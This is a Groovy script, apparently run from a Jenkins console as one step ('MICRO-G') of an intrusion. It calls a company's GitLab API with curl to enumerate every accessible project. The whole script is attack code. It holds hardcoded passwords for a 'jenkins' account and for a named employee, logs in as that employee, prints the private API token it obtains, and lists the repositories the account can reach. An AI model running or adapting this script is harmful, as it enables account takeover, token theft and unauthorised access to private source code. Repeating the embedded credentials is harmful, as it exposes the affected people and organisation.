// MICRO-G: List ALL GitLab projects (paginated)
def run = { cmd ->
    def p = ["bash", "-c", cmd].execute()
    def out = new StringBuffer(); def err = new StringBuffer()
    p.consumeProcessOutput(out, err)
    p.waitForOrKill(20000)
    out.toString()
}

def baseUrl = "https://gitlab.dev.claroshop.com/api/v4"
def auth = "-u 'jenkins:e6LBqIkOI\$PR1XX2oia'"
def allProjects = []

// Try with jenkins user - all_available=true, paginated
(1..5).each { page ->
    def resp = run("curl -sk ${auth} '${baseUrl}/projects?per_page=100&page=${page}&all_available=true&order_by=id&sort=asc' --max-time 15")
    if (!resp || resp.contains('"401"') || resp.trim() == '[]') {
        if (resp.trim() == '[]') return  // no more pages
        return
    }
    // Extract project name_with_namespace and http_url
    def names = (resp =~ /"path_with_namespace":"([^"]+)"/).collect { it[1] }
    def urls = (resp =~ /"http_url_to_repo":"([^"]+)"/).collect { it[1] }
    names.eachWithIndex { n, i ->
        allProjects << [ns: n, url: urls[i] ?: ""]
    }
    println "Page ${page}: got ${names.size()} projects"
    if (names.size() < 100) return  // last page
}

// Also try maria.policarpo session to get token, then list
def sessionResp = run('curl -sk -L -X POST "https://gitlab.dev.claroshop.com/api/v4/session" -H "Content-Type: application/json" -d \'{"login":"maria.policarpo","password":"FtMRl4fDXzIDY4Yj"}\' --max-time 8')
def token = (sessionResp =~ /"private_token":"([^"]+)"/)?.getAt(0)?.getAt(1)
if (token) {
    println "\n=== Got token for maria.policarpo: ${token} ==="
    def resp2 = run("curl -sk -H 'PRIVATE-TOKEN: ${token}' '${baseUrl}/projects?per_page=100&page=1&all_available=true' --max-time 15")
    def names2 = (resp2 =~ /"path_with_namespace":"([^"]+)"/).collect { it[1] }
    println "maria.policarpo can see ${names2.size()} projects on page 1"
    names2.each { println "  ${it}" }
} else {
    println "\n=== maria.policarpo session: no token. Response: ${sessionResp.take(200)} ==="
}

println "\n=== ALL PROJECTS (jenkins user) ==="
println "Total: ${allProjects.size()}"
allProjects.sort { it.ns }.each { p ->
    println "  ${p.ns.padRight(60)} ${p.url}"
}

println "\n=== DONE MICRO-G ==="
